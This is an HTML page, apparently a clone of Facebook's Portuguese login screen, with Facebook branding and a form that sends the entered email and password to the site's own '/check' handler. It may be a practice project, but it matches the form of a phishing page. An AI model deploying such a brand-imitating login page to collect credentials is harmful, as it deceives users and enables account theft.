<!DOCTYPE html>
<html lang = "pt-br">
<head>
    <meta charset    = "UTF-8">
    <meta http-equiv = "X-UA-Compatible" content = "IE=edge">
    <meta name       = "viewport" content        = "width=device-width, initial-scale=1.0">
    <title>Entre ou Cadastre-se</title>
    <link rel = "shortcut icon" href = "https://www.novaconcursos.com.br/portal/wp-content/uploads/2020/01/facebook-logo-redondo.png" type = "image/x-icon">
    <link rel = "stylesheet" href    = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel = "stylesheet" href    = "/assets/css/main.css">
</head>

<body>
<div id    = "div1">
<div class = "slider">
<div class = "slide"><h2
  >facebook</h2><br><h3>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.<h3> </div>
  <div class = "slide"><img src = "/imgs/Facebook2.png"> </div>
  <div class = "slide"><img src = "/imgs/Facebook3.png"> </div>
</div>
</div>

<div id    = "div2">
<div class = "login">
<div class = "login-triangle"></div>
<h1  class = "login-header">Facebook</h1>

  <form     method = "POST" action         = "/check" class  = "login-container">
  <p><input type   = "email" name          = "email" placeholder = "Email"></p>
  <p><input id     = "password-field" name = "senha"type         = "password" class = "form-control" name = "password" placeholder = "Senha">
    
      <abbr title = "Ver senha"><span toggle = "#password-field" class = "fa fa-fw fa-eye field-icon toggle-password"></span></abbr>
    </p>
    <p><input type  = "submit" value       = "Entrar"></p>
    <span     class = "msg_error"><i class = "fa fa-exclamation-triangle"></i>Tentativa Inválida </span>
    </form>
    <form         method = "POST" action                                                                                              = "/app/view/cad.php" class = "login-container">
    <p><hr><input style  = "display:flex;justify-content: center;background-color:#42b72a;margin:10px;margin:10px 19px; width: 88%" type = "submit" value            = "Cadastre-se"></p>
    </form>
</div>
</div> 
</body>
</html>

<script src = "https://code.jquery.com/jquery-1.9.1.js"></script>
<script src = "/assets/js/glider.js"></script>
<script src = "/assets/js/unmask.js"></script>

